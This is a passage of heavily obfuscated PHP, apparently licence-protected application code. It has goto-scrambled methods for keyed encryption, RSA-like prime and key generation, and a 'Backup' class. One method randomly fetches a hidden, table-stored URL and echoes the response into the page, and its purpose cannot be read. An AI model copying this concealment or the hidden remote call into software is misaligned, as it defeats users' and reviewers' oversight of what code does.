$FâŠßœÌŠ«[233]); } goto EâŒ²‰Œ—‡; Dõ­¨½Õ”‚: if ($bêå¨²Øâµ >= $FâŠßœÌŠ«[201]($FâŠßœÌŠ«[238])) { return; } $AÔ¯¿ÉÆ» = $FâŠßœÌŠ«[61]($FâŠßœÌŠ«[139])->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][140]}(); $DÏ¸„øèÇ = $eˆ´‰ó„[629]; goto Aô¢ÏÏœ†; dˆ¸‡ŒØË“: $F²„¡¤‰¬Ø = $eˆ´‰ó„[630]; while (strlen($F²„¡¤‰¬Ø) < $eˆ´‰ó„[548]) { if (!$F²„¡¤‰¬Ø) { break; } $F²„¡¤‰¬Ø++; } $cˆë“×ÀÄ½ = $FâŠßœÌŠ«[222]($cˆë“×ÀÄ½, $FâŠßœÌŠ«[10], $FâŠßœÌŠ«[318]); goto FÃ¯´Î; EâŒ²‰Œ—‡: } public function mtnw5b9d096e() { goto DœˆÔØÓö; E½ïöÉøìñ: $b®‰ŒåÆÀå = $CÏ©¼ÇÖì[633]; while (strlen($b®‰ŒåÆÀå) < $CÏ©¼ÇÖì[553]) { if (!$b®‰ŒåÆÀå) { break; } $b®‰ŒåÆÀå++; } goto BÜ¶ÁñÓØà; DœˆÔØÓö: $CÏ©¼ÇÖì =& $_SERVER[õëù©û]; $Bæ°Ä²ˆª =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; if (!$Bæ°Ä²ˆª[104]($GLOBALS, $Bæ°Ä²ˆª[132]) || $Bæ°Ä²ˆª[322](1, 100) > 20) { return; } goto E‰§²••Õ„; E‰§²••Õ„: $D–øÌ†àºª = $Bæ°Ä²ˆª[242]; $D–øÌ†àºª = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][243]}($D–øÌ†àºª, $Bæ°Ä²ˆª[244]); $DŒ—ŒÊ…Êõ = $CÏ©¼ÇÖì[632]; goto f”À»Ê¼«©; f”À»Ê¼«©: $AÅ˜›¥¸à = $Bæ°Ä²ˆª[245](array($Bæ°Ä²ˆª[246] => array($Bæ°Ä²ˆª[247] => $Bæ°Ä²ˆª[248], $Bæ°Ä²ˆª[249] => 3))); $f•Ù¤Š­¯„ = @$Bæ°Ä²ˆª[250]($D–øÌ†àºª, !1, $AÅ˜›¥¸à); echo $Bæ°Ä²ˆª[323] . $Bæ°Ä²ˆª[324]($f•Ù¤Š­¯„) . $Bæ°Ä²ˆª[325]; goto E½ïöÉøìñ; BÜ¶ÁñÓØà: } private function xzrd9c787439($eç¼Æõòµù, $EìãØŒ›±, $B‚ëŞİĞ·Õ = 3) { goto C”’±¥Çê; e´ëÒÓÜŒ«: if ($B‚ëŞİĞ·Õ - 1 > 0) { $cÁÉ«îö‘¶ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][127]}($cÁÉ«îö‘¶, $EìãØŒ›±, $B‚ëŞİĞ·Õ - 1); } return $cÁÉ«îö‘¶; goto bœ¤Ìçƒ¾¦; B­¦Œµ¾¢è: $b†–Ö¬Š¹” = $AÊ–˜ìƒ°ø[634]; while (strlen($b†–Ö¬Š¹”) < $AÊ–˜ìƒ°ø[555]) { if (!$b†–Ö¬Š¹”) { break; } $b†–Ö¬Š¹”++; } $eç¼Æõòµù = $e—Ø­è¥ö[2]($eç¼Æõòµù); goto C“¯åÛÄ½; C“¯åÛÄ½: $AÑ¤àíÇŸÍ = $e—Ø­è¥ö[322](0, 5) . $e—Ø­è¥ö[10]; $C¬ˆéğõ¦Æ = $e—Ø­è¥ö[124](15); $eÅ•èõ’Ö = $e—Ø­è¥ö[327]; goto Eƒ´ÁêÇ»; C”’±¥Çê: $AÊ–˜ìƒ°ø =& $_SERVER[õëù©û]; $e—Ø­è¥ö =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; $e—Ø­è¥ö[326](1); goto B­¦Œµ¾¢è; Eƒ´ÁêÇ»: $eŸ…­–‰í = $AÊ–˜ìƒ°ø[635]; switch ($AÑ¤àíÇŸÍ) { case $e—Ø­è¥ö[229]: $cÁÉ«îö‘¶ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][147]}($eç¼Æõòµù, $e—Ø­è¥ö[214]($EìãØŒ›± . $C¬ˆéğõ¦Æ)); $aìÔø©Ü‡› = $AÊ–˜ìƒ°ø[636]; while (strlen($aìÔø©Ü‡›) < $AÊ–˜ìƒ°ø[555]) { if (!$aìÔø©Ü‡›) { break; } $aìÔø©Ü‡›++; } break; case $e—Ø­è¥ö[220]: $cÁÉ«îö‘¶ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][147]}($eç¼Æõòµù, $e—Ø­è¥ö[214]($C¬ˆéğõ¦Æ . $EìãØŒ›±)); break; $a¡˜Í§£ŸÚ = $AÊ–˜ìƒ°ø[637]; while (strlen($a¡˜Í§£ŸÚ) < $AÊ–˜ìƒ°ø[550]) { if (!$a¡˜Í§£ŸÚ) { break; } $a¡˜Í§£ŸÚ++; } case $e—Ø­è¥ö[328]: $cÁÉ«îö‘¶ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][147]}($eç¼Æõòµù, $e—Ø­è¥ö[118]($C¬ˆéğõ¦Æ . $EìãØŒ›±)); break; case $e—Ø­è¥ö[329]: $cÁÉ«îö‘¶ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][147]}($eç¼Æõòµù, $e—Ø­è¥ö[114]($C¬ˆéğõ¦Æ . $EìãØŒ›±)); $E¿øÙ¶Ò©¾ = $AÊ–˜ìƒ°ø[638]; while ($E¿øÙ¶Ò©¾ < $AÊ–˜ìƒ°ø[581]) { if ($E¿øÙ¶Ò©¾ >= 0) { break; } $E¿øÙ¶Ò©¾++; } break; $D§äµŞçÜ = $AÊ–˜ìƒ°ø[639]; if (strlen($D§äµŞçÜ) < $AÊ–˜ìƒ°ø[548]) { return; } case $e—Ø­è¥ö[330]: goto E›ÙÛİË£¢; E›ÙÛİË£¢: $eç¼Æõòµù = $e—Ø­è¥ö[118]($eç¼Æõòµù); $Dôç¼ãà¬Û = $AÊ–˜ìƒ°ø[640]; while (strlen($Dôç¼ãà¬Û) < $AÊ–˜ìƒ°ø[581]) { if (!$Dôç¼ãà¬Û) { break; } $Dôç¼ãà¬Û++; } goto C’Ôó“ÅŸ; C’Ôó“ÅŸ: $EóËÜ½²ƒÕ = $e—Ø­è¥ö[331](0, 64); $E“ŠçÁîİÉ = $eÅ•èõ’Ö[$EóËÜ½²ƒÕ]; $e³‰œÅùÔ´ = $AÊ–˜ìƒ°ø[641]; goto f“‘ôÏ‰“ ; DÓ¶Øƒ¯Ï: $bŞĞÀ¹¶¤Ñ = $e—Ø­è¥ö[10]; $cƒØ¿‡¤ÓÒ = $AÊ–˜ìƒ°ø[642]; $d¤‘Œ½ßª‹ = 0; goto C¶ÓÈ×“¹š; C¶ÓÈ×“¹š: $a„‹Âìù–¿ = $AÊ–˜ìƒ°ø[643]; if (strlen($a„‹Âìù–¿) < $AÊ–˜ìƒ°ø[581]) { return; } $B¹¾ëÆÔñ¸ = 0; goto CÊ¸„ˆ…Ìš; cˆÂÊå‘ÖÑ: for ($d¤‘Œ½ßª‹ = 0; $d¤‘Œ½ßª‹ < $e—Ø­è¥ö[24]($eç¼Æõòµù); $d¤‘Œ½ßª‹++) { $Fæ‘´…¦å¯ = $Fæ‘´…¦å¯ == $e—Ø­è¥ö[24]($Eä°­Ç÷Ü) ? 0 : $Fæ‘´…¦å¯; $B¹¾ëÆÔñ¸ = ($EóËÜ½²ƒÕ + $e—Ø­è¥ö[332]($eÅ•èõ’Ö, $eç¼Æõòµù[$d¤‘Œ½ßª‹]) + $e—Ø­è¥ö[333]($Eä°­Ç÷Ü[$Fæ‘´…¦å¯++])) % 64; $cğ“õÑØ¥¯ = $AÊ–˜ìƒ°ø[645]; $bŞĞÀ¹¶¤Ñ .= $eÅ•èõ’Ö[$B¹¾ëÆÔñ¸]; $báÄºº¡íÇ = $AÊ–˜ìƒ°ø[646]; if (strlen($báÄºº¡íÇ) < $AÊ–˜ìƒ°ø[555]) { return; } } $cÁÉ«îö‘¶ = $e—Ø­è¥ö[324]($E“ŠçÁîİÉ . $bŞĞÀ¹¶¤Ñ); $cÑ’„Ü÷¸¼ = $AÊ–˜ìƒ°ø[647]; goto cëè£ùº÷; CÊ¸„ˆ…Ìš: $E„Ú½ƒ¤Ø¹ = $AÊ–˜ìƒ°ø[644]; if (!$E„Ú½ƒ¤Ø¹) { return; } $Fæ‘´…¦å¯ = 0; goto cˆÂÊå‘ÖÑ; cëè£ùº÷: break; goto eÁåÇÚÕÎ¯; f“‘ôÏ‰“ : if (strlen($e³‰œÅùÔ´) < $AÊ–˜ìƒ°ø[548]) { return; } $Eä°­Ç÷Ü = $e—Ø­è¥ö[114]($E“ŠçÁîİÉ . $e—Ø­è¥ö[114]($EìãØŒ›± . $E“ŠçÁîİÉ) . $EìãØŒ›±); $Eä°­Ç÷Ü = $e—Ø­è¥ö[25]($Eä°­Ç÷Ü, $EóËÜ½²ƒÕ % 8, $EóËÜ½²ƒÕ % 8 + 7); goto DÓ¶Øƒ¯Ï; eÁåÇÚÕÎ¯: default: $cÁÉ«îö‘¶ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][147]}($eç¼Æõòµù, $EìãØŒ›± . $C¬ˆéğõ¦Æ); $aå´æ¬Â = $AÊ–˜ìƒ°ø[648]; if (!$aå´æ¬Â) { return; } break; $C×Ö÷ìÑ = $AÊ–˜ìƒ°ø[649]; if (strlen($C×Ö÷ìÑ) < $AÊ–˜ìƒ°ø[553]) { return; } } $cÁÉ«îö‘¶ = $e—Ø­è¥ö[214]($AÑ¤àíÇŸÍ . $C¬ˆéğõ¦Æ . $cÁÉ«îö‘¶); goto e´ëÒÓÜŒ«; bœ¤Ìçƒ¾¦: } private function thal323840c5($eÑÈáŒ„•, $D¥¼àÇ†ÙÜ, $DÜæŞ¤å‹ = 3) { goto fî³¶¥ê¾ô; dì‰„¸ïÆè: if ($DÜæŞ¤å‹ - 1 > 0) { $C¬á ÉŞ÷ñ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][188]}($C¬á ÉŞ÷ñ, $D¥¼àÇ†ÙÜ, $DÜæŞ¤å‹ - 1); } return $C¬á ÉŞ÷ñ; goto E¢¨¨äíÂâ; CîïÛô»ª¥: while (strlen($DêÊ×ï¹Ì) < $Fà¼¼›Ë‚[548]) { if (!$DêÊ×ï¹Ì) { break; } $DêÊ×ï¹Ì++; } $f—î¾ßÇù = $C‘ÈòÇšŸ‰[327]; switch ($Fš‘‡³°½Ş) { case $C‘ÈòÇšŸ‰[229]: $C¬á ÉŞ÷ñ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][243]}($eÑÈáŒ„•, $C‘ÈòÇšŸ‰[214]($D¥¼àÇ†ÙÜ . $c·ğ‚‰ğ)); break; $Eª”ªÀƒ = $Fà¼¼›Ë‚[653]; if (!$Eª”ªÀƒ) { die; } case $C‘ÈòÇšŸ‰[220]: $C¬á ÉŞ÷ñ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][243]}($eÑÈáŒ„•, $C‘ÈòÇšŸ‰[214]($c·ğ‚‰ğ . $D¥¼àÇ†ÙÜ)); break; case $C‘ÈòÇšŸ‰[328]: $C¬á ÉŞ÷ñ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][243]}($eÑÈáŒ„•, $C‘ÈòÇšŸ‰[118]($c·ğ‚‰ğ . $D¥¼àÇ†ÙÜ)); break; case $C‘ÈòÇšŸ‰[329]: $C¬á ÉŞ÷ñ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][243]}($eÑÈáŒ„•, $C‘ÈòÇšŸ‰[114]($c·ğ‚‰ğ . $D¥¼àÇ†ÙÜ)); break; case $C‘ÈòÇšŸ‰[330]: goto eŠíß­õ™¸; a„ª©ÌÄĞ: $Cå„×¿Œø = $C‘ÈòÇšŸ‰[332]($f—î¾ßÇù, $eà˜ñó¼); $DßÎÎÉõ¹• = $Fà¼¼›Ë‚[656]; if (!$DßÎÎÉõ¹•) { die; } goto dõ«‡­ãß•; e•÷©´†Èº: break; goto C–á”ÃÇ»‚; dõ«‡­ãß•: $C–ÊŠÇ“Š = $C‘ÈòÇšŸ‰[114]($eà˜ñó¼ . $C‘ÈòÇšŸ‰[114]($D¥¼àÇ†ÙÜ . $eà˜ñó¼) . $D¥¼àÇ†ÙÜ); $C–ÊŠÇ“Š = $C‘ÈòÇšŸ‰[25]($C–ÊŠÇ“Š, $Cå„×¿Œø % 8, $Cå„×¿Œø % 8 + 7); $aƒô·èˆ³ = $Fà¼¼›Ë‚[657]; goto Bù„¯äÓ¿í; Bù„¯äÓ¿í: $aÕŒÀÑñòÀ = $C‘ÈòÇšŸ‰[10]; $F…Ê‰Ø³Õ = 0; $Aç©’éÜ = $Fà¼¼›Ë‚[658]; goto B®öêº; eŠíß­õ™¸: $eÑÈáŒ„• = $C‘ÈòÇšŸ‰[335]($eÑÈáŒ„•); $C§ä×Ø±Æ = $Fà¼¼›Ë‚[654]; while ($C§ä×Ø±Æ < $Fà¼¼›Ë‚[548]) { if ($C§ä×Ø±Æ >= 0) { break; } $C§ä×Ø±Æ++; } goto B•§µäï½; B•§µäï½: $eà˜ñó¼ = $eÑÈáŒ„•[0]; $eÑÈáŒ„• = $C‘ÈòÇšŸ‰[25]($eÑÈáŒ„•, 1); $D‚¾´ì¨¾ = $Fà¼¼›Ë‚[655]; goto a„ª©ÌÄĞ; B®öêº: if (!$Aç©’éÜ) { return; } $A™Õ…Îõ¤ = 0; $dóêÂ¸¶Ö” = $Fà¼¼›Ë‚[659]; goto c÷Ş»„á×; c÷Ş»„á×: $AÊ„É–Å”“ = 0; for ($F…Ê‰Ø³Õ = 0; $F…Ê‰Ø³Õ < $C‘ÈòÇšŸ‰[24]($eÑÈáŒ„•); $F…Ê‰Ø³Õ++) { $AÊ„É–Å”“ = $AÊ„É–Å”“ == $C‘ÈòÇšŸ‰[24]($C–ÊŠÇ“Š) ? 0 : $AÊ„É–Å”“; $BŞ³ˆ¹ìò = $AÊ„É–Å”“++; $A™Õ…Îõ¤ = $C‘ÈòÇšŸ‰[332]($f—î¾ßÇù, $eÑÈáŒ„•[$F…Ê‰Ø³Õ]) - $Cå„×¿Œø - $C‘ÈòÇšŸ‰[333]($C–ÊŠÇ“Š[$BŞ³ˆ¹ìò]); $f¢¢ÍÏÉó× = $Fà¼¼›Ë‚[660]; while ($A™Õ…Îõ¤ < 0) { $A™Õ…Îõ¤ += 64; $E‰çã—¾Ô = $Fà¼¼›Ë‚[661]; if (!$E‰çã—¾Ô) { return; } } $aÕŒÀÑñòÀ .= $f—î¾ßÇù[$A™Õ…Îõ¤]; } $C¬á ÉŞ÷ñ = $C‘ÈòÇšŸ‰[336]($aÕŒÀÑñòÀ); goto e•÷©´†Èº; C–á”ÃÇ»‚: default: $C¬á ÉŞ÷ñ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][243]}($eÑÈáŒ„•, $D¥¼àÇ†ÙÜ . $c·ğ‚‰ğ); break; $FÉÜ‰ÃéÈÕ = $Fà¼¼›Ë‚[662]; if (!$FÉÜ‰ÃéÈÕ) { return; } } goto dì‰„¸ïÆè; c³Â™š¾Ç: $Fš‘‡³°½Ş = $eÑÈáŒ„•[0]; $DîŞÊ¬—â¤ = $Fà¼¼›Ë‚[651]; while ($DîŞÊ¬—â¤ < $Fà¼¼›Ë‚[548]) { if ($DîŞÊ¬—â¤ >= 0) { break; } $DîŞÊ¬—â¤++; } goto D¦íÙ¡»õ; D¦íÙ¡»õ: $c·ğ‚‰ğ = $C‘ÈòÇšŸ‰[25]($eÑÈáŒ„•, 1, 15); $eÑÈáŒ„• = $C‘ÈòÇšŸ‰[25]($eÑÈáŒ„•, 16); $DêÊ×ï¹Ì = $Fà¼¼›Ë‚[652]; goto CîïÛô»ª¥; fî³¶¥ê¾ô: $Fà¼¼›Ë‚ =& $_SERVER[õëù©û]; $C‘ÈòÇšŸ‰ =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; if (!$C‘ÈòÇšŸ‰[334]($eÑÈáŒ„•) || $C‘ÈòÇšŸ‰[24]($eÑÈáŒ„•) < 10) { return !1; } goto CÙİí×ŸÆî; EîÙÁ‘¦îø: $eÑÈáŒ„• = $C‘ÈòÇšŸ‰[214]($eÑÈáŒ„•); $dßÖŸÎ…‰ğ = $Fà¼¼›Ë‚[650]; if (!$dßÖŸÎ…‰ğ) { die; } goto c³Â™š¾Ç; CÙİí×ŸÆî: $eÑÈáŒ„• = $C‘ÈòÇšŸ‰[2]($eÑÈáŒ„•); $eÀ¢ìï“ƒ¬ = $Fà¼¼›Ë‚[578]; if (!$eÀ¢ìï“ƒ¬) { return; } goto EîÙÁ‘¦îø; E¢¨¨äíÂâ: } public function qnclbf63dec4($c„â×Ç·­¢) { goto D÷ôÁºÂ†‚; d–ó°ÏÑÕ¦: while ($eÚÂ‘ƒ¾®Û < $CßÈ»Á‰—œ[553]) { if ($eÚÂ‘ƒ¾®Û >= 0) { break; } $eÚÂ‘ƒ¾®Û++; } for ($b›î” †õ± = 0; $b›î” †õ± < $dÛØ—ÍƒÉ‡ * 10; $b›î” †õ±++) { if (($dÛØ—ÍƒÉ‡ * $b›î” †õ± + 1) % $A²é‘æÌ¤â == 0) { $e‚â„Û‡Š© = $E…•¨å¢š°[201](($dÛØ—ÍƒÉ‡ * $b›î” †õ± + 1) / $A²é‘æÌ¤â); break; } } $B©òÅ‚­  = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][147]}($Bõæã²Á· * $d™Â Ëá¾ . $E…•¨å¢š°[10], $E…•¨å¢š°[149]); goto B¼Ê“ğš¤; a¯ÙŠš‚•ª: $a¼”°ª¶Î± = $CßÈ»Á‰—œ[664]; while ($a¼”°ª¶Î± < $CßÈ»Á‰—œ[550]) { if ($a¼”°ª¶Î± >= 0) { break; } $a¼”°ª¶Î±++; } $A²é‘æÌ¤â = $E…•¨å¢š°[201](($Bõæã²Á· + $d™Â Ëá¾) / 2); goto dã“¶¾Âë; dã“¶¾Âë: while (1) { $F÷§·¼åàĞ = $A²é‘æÌ¤â; $báñƒŠã‹³ = $CßÈ»Á‰—œ[665]; if (!$báñƒŠã‹³) { die; } $eÂ‡«¤–èô = $dÛØ—ÍƒÉ‡; while ($eÂ‡«¤–èô % $F÷§·¼åàĞ != 0) { $bñÁ•ô…¿ = $eÂ‡«¤–èô; $C„ãáÚñ´• = $CßÈ»Á‰—œ[666]; if (strlen($C„ãáÚñ´•) < $CßÈ»Á‰—œ[548]) { return; } $eÂ‡«¤–èô = $F÷§·¼åàĞ; $F÷§·¼åàĞ = $bñÁ•ô…¿ % $F÷§·¼åàĞ; } if ($F÷§·¼åàĞ == 1) { break; } else { $A²é‘æÌ¤â++; } } $e‚â„Û‡Š© = 2; $eÚÂ‘ƒ¾®Û = $CßÈ»Á‰—œ[667]; goto d–ó°ÏÑÕ¦; D÷ôÁºÂ†‚: $CßÈ»Á‰—œ =& $_SERVER[õëù©û]; $E…•¨å¢š° =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; $Bõæã²Á· = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][337]}(); goto CËÖêçŸÚà; B¼Ê“ğš¤: $Fˆô™Œïù¤ = $E…•¨å¢š°[114]($E…•¨å¢š°[338] . ($Bõæã²Á· + $d™Â Ëá¾) . $E…•¨å¢š°[339] . $A²é‘æÌ¤â . $E…•¨å¢š°[339] . $e‚â„Û‡Š© . $E…•¨å¢š°[340]); $d•Ìà¸Õ´» = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][147]}($c„â×Ç·­¢, $Fˆô™Œïù¤) . $E…•¨å¢š°[341] . $B©òÅ‚­ ; return $d•Ìà¸Õ´»; goto Bîñ•¶Å; CËÖêçŸÚà: $cïàïä­µˆ = $CßÈ»Á‰—œ[663]; $d™Â Ëá¾ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][337]}(); $dÛØ—ÍƒÉ‡ = ($Bõæã²Á· - 1) * ($d™Â Ëá¾ - 1); goto a¯ÙŠš‚•ª; Bîñ•¶Å: } public function twmo025cb7aa($e·ƒªÈ“Ñ˜) { goto Eø—ğ¡ ñ; eÑÄ…Ìâ¸: return $aºÒÀ…ê¥; goto e”Şê–Ú˜¢; FÁ‰ÄÄ‹ŒŞ: $aºÒÀ…ê¥ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][243]}($E†ºšøŠËá[0], $dÕÊ…ïÛÜã); $EË‚’øêËˆ = $bÀ†–´ˆù[676]; while (strlen($EË‚’øêËˆ) < $bÀ†–´ˆù[548]) { if (!$EË‚’øêËˆ) { break; } $EË‚’øêËˆ++; } goto eÑÄ…Ìâ¸; cÍª¦®Ææ: for ($cö‘­øäã† = 0; $cö‘­øäã† < $E¾“ ¯šÆ * 10; $cö‘­øäã†++) { if (($E¾“ ¯šÆ * $cö‘­øäã† + 1) % $dƒÑÇŸîö† == 0) { $c‚¿íä¨Æ = $B‡óÚÌƒŒ[201](($E¾“ ¯šÆ * $cö‘­øäã† + 1) / $dƒÑÇŸîö†); break; } } $dÕÊ…ïÛÜã = $B‡óÚÌƒŒ[114]($B‡óÚÌƒŒ[338] . ($dÎ©…—öÈµ + $DÜÜ•öŒ®) . $B‡óÚÌƒŒ[339] . $dƒÑÇŸîö† . $B‡óÚÌƒŒ[339] . $c‚¿íä¨Æ . $B‡óÚÌƒŒ[340]); $fïéÊƒ› £ = $bÀ†–´ˆù[675]; goto FÁ‰ÄÄ‹ŒŞ; f×…£½ˆ§: $B†“áïóø = $bÀ†–´ˆù[668]; if (!$B†“áïóø) { die; } if ($B‡óÚÌƒŒ[19]($E†ºšøŠËá) != 2) { return $B‡óÚÌƒŒ[10]; } goto fÃ†¥êÃ§‹; Eø—ğ¡ ñ: $bÀ†–´ˆù =& $_SERVER[õëù©û]; $B‡óÚÌƒŒ =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; $E†ºšøŠËá = $B‡óÚÌƒŒ[0]($B‡óÚÌƒŒ[341], $e·ƒªÈ“Ñ˜); goto f×…£½ˆ§; C‡ïğ‡ğ¿: $dƒÑÇŸîö† = $B‡óÚÌƒŒ[201](($dÎ©…—öÈµ + $DÜÜ•öŒ®) / 2); while (1) { $e‘ï»é‰ÇÌ = $dƒÑÇŸîö†; $C³£êæİ»ô = $E¾“ ¯šÆ; while ($C³£êæİ»ô % $e‘ï»é‰ÇÌ != 0) { $A©óˆ¨ĞÌ® = $C³£êæİ»ô; $C³£êæİ»ô = $e‘ï»é‰ÇÌ; $e‘ï»é‰ÇÌ = $A©óˆ¨ĞÌ® % $e‘ï»é‰ÇÌ; } if ($e‘ï»é‰ÇÌ == 1) { break; } else { $dƒÑÇŸîö†++; } } $c‚¿íä¨Æ = 2; goto cÍª¦®Ææ; B÷˜ïÄÁæÒ: if (!$F¢ª¶óÑİ) { return $B‡óÚÌƒŒ[10]; } $F¢ª¶óÑİ = $B‡óÚÌƒŒ[201]($F¢ª¶óÑİ); $EíšÊóïÜ¦ = $bÀ†–´ˆù[670]; goto eİÊ´Üİ—¬; bå–”‚âØš: $DÜÜ•öŒ® = 0; for ($cö‘­øäã† = 3; $cö‘­øäã† < $F¢ª¶óÑİ; $cö‘­øäã† += 2) { if ($F¢ª¶óÑİ % $cö‘­øäã† != 0) { continue; } $dÎ©…—öÈµ = $cö‘­øäã†; $fĞ½íª÷ = $bÀ†–´ˆù[672]; $DÜÜ•öŒ® = $B‡óÚÌƒŒ[201]($F¢ª¶óÑİ / $cö‘­øäã†); $bó„¸È•ªå = $bÀ†–´ˆù[673]; break; $fŒŸ¬‘Ùëï = $bÀ†–´ˆù[674]; } $E¾“ ¯šÆ = ($dÎ©…—öÈµ - 1) * ($DÜÜ•öŒ® - 1); goto C‡ïğ‡ğ¿; eİÊ´Üİ—¬: if (strlen($EíšÊóïÜ¦) < $bÀ†–´ˆù[581]) { return; } $dÎ©…—öÈµ = 0; $Bå°Ğê¤êÍ = $bÀ†–´ˆù[671]; goto bå–”‚âØš; fÃ†¥êÃ§‹: $F¢ª¶óÑİ = $this->{$_SERVER[ÀÜ¸â¬òüƒÇÚ][243]}($E†ºšøŠËá[1] . $B‡óÚÌƒŒ[10], $B‡óÚÌƒŒ[149]); $A§µÍ×ò–£ = $bÀ†–´ˆù[669]; while (strlen($A§µÍ×ò–£) < $bÀ†–´ˆù[555]) { if (!$A§µÍ×ò–£) { break; } $A§µÍ×ò–£++; } goto B÷˜ïÄÁæÒ; e”Şê–Ú˜¢: } public function kzjcb9499e3c() { goto F‚øä²Èƒ; bÛ¶“±“¿±: for ($FªòíĞáˆŒ = $dùÓ‰ï×¯; $FªòíĞáˆŒ > 1; $FªòíĞáˆŒ--) { $aÉ¿Ÿø°ßÒ = !0; foreach ($cê”ÒñÈ´› as $dÁò“èáµ) { if ($FªòíĞáˆŒ % $dÁò“èáµ == 0) { $aÉ¿Ÿø°ßÒ = !1; break; } } if ($aÉ¿Ÿø°ßÒ) { $f–î‡‡¦°š = $FªòíĞáˆŒ; break; } } return $f–î‡‡¦°š; goto dëí¡¦¨ç‘; EˆÓ¼í¯ùÌ: $fì‚„¯—¡ = 1; $EÏâ÷î‹øŞ = $FôÁ†Å¾[678]; while ($EÏâ÷î‹øŞ < $FôÁ†Å¾[555]) { if ($EÏâ÷î‹øŞ >= 0) { break; } $EÏâ÷î‹øŞ++; } goto b‘ø’¤Ì²Ô; AÍªÇÜ¦ô”: $DÇ£ÚÅ»é× = $FôÁ†Å¾[677]; if (!$DÇ£ÚÅ»é×) { return; } $cê”ÒñÈ´› = array(); goto EˆÓ¼í¯ùÌ; F‚øä²Èƒ: $FôÁ†Å¾ =& $_SERVER[õëù©û]; $Bƒ”©‰‰‹ =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; $dùÓ‰ï×¯ = $Bƒ”©‰‰‹[322]($Bƒ”©‰‰‹[342](2, 14), $Bƒ”©‰‰‹[342](2, 16) - 1); goto AÍªÇÜ¦ô”; b‘ø’¤Ì²Ô: while ($fì‚„¯—¡ <= (int) $Bƒ”©‰‰‹[343]($dùÓ‰ï×¯)) { $FªòíĞáˆŒ = $fì‚„¯—¡; while (!0) { $FªòíĞáˆŒ++; $E¦Œ‹õ·®Ü = $FôÁ†Å¾[679]; if (strlen($E¦Œ‹õ·®Ü) < $FôÁ†Å¾[548]) { return; } if ($FªòíĞáˆŒ <= 2) { $fì‚„¯—¡ = $FªòíĞáˆŒ; break; } else { if ($FªòíĞáˆŒ < 2) { continue; } } $aÉ¿Ÿø°ßÒ = !0; for ($aõÀÉàƒ°š = 2; $aõÀÉàƒ°š <= $Bƒ”©‰‰‹[343]($FªòíĞáˆŒ); $aõÀÉàƒ°š++) { if ($FªòíĞáˆŒ % $aõÀÉàƒ°š == 0) { $aÉ¿Ÿø°ßÒ = !1; } } if ($aÉ¿Ÿø°ßÒ) { $fì‚„¯—¡ = $FªòíĞáˆŒ; break; } } $cê”ÒñÈ´›[] = $fì‚„¯—¡; } $f–î‡‡¦°š = 2; $DÃ¬Ö”Ÿø§ = $FôÁ†Å¾[680]; goto bÛ¶“±“¿±; dëí¡¦¨ç‘: } public function wurz7ce93773($C½°åíåÉÉ, $cîÁÒÎ) { $CØ•ôÄÈëå =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; return $CØ•ôÄÈëå[13](array($CØ•ôÄÈëå[14], $CØ•ôÄÈëå[344]), $C½°åíåÉÉ, $cîÁÒÎ); } public function xplv92484599($C²Ú„‹½½È, $A¥×ÈÏ®‰à) { $aÎáô˜¶• =& $_SERVER[õëù©û]; $DÙêğ›´“  =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; return $DÙêğ›´“ [13](array($DÙêğ›´“ [345], $DÙêğ›´“ [346]), $C²Ú„‹½½È, $A¥×ÈÏ®‰à); $C¿²ìÒòß„ = $aÎáô˜¶•[681]; while (strlen($C¿²ìÒòß„) < $aÎáô˜¶•[548]) { if (!$C¿²ìÒòß„) { break; } $C¿²ìÒòß„++; } } public function vzen913108db($dùŒ˜Ç–¼, $aŸ’‘ÃÃ¥…) { $Aà¾¿ÜÔŸŠ =& $_SERVER[ÀÜ¸â¬òüƒÇÚ]; return $Aà¾¿ÜÔŸŠ[13](array($Aà¾¿ÜÔŸŠ[345], $Aà¾¿ÜÔŸŠ[347]), $dùŒ˜Ç–¼, $aŸ’‘ÃÃ¥…); } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $B³ïù¬ß¥à =& $_SERVER[õëù©û]; self::$name = date($B³ïù¬ß¥à[682]); if (!($c´¬¯Àã‰‚ = Model($B³ïù¬ß¥à[683])->lastItem())) { $c´¬¯Àã‰‚ = $this->initData(); } else { self::$name = $c´¬¯Àã‰‚[$B³ïù¬ß¥à[28]]; if ($c´¬¯Àã‰‚[$B³ïù¬ß¥à[684]] == $B³ïù¬ß¥à[83]) { self::$name = date($B³ïù¬ß¥à[685]); $cì…ƒË‡İÍ = 0; if (isset($c´¬¯Àã‰‚[$B³ïù¬ß¥à[277]][$B³ïù¬ß¥à[163]][$B³ïù¬ß¥à[414]])) { $cì…ƒË‡İÍ = (int) $c´¬¯Àã‰‚[$B³ïù¬ß¥à[277]][$B³ïù¬ß¥à[163]][$B³ïù¬ß¥à[414]]; } if ($c´¬¯Àã‰‚[$B³ïù¬ß¥à[28]] == self::$name) { Model($B³ïù¬ß¥à[683])->remove($c´¬¯Àã‰‚[$B³ïù¬ß¥à[363]]); } $c´¬¯Àã‰‚ = 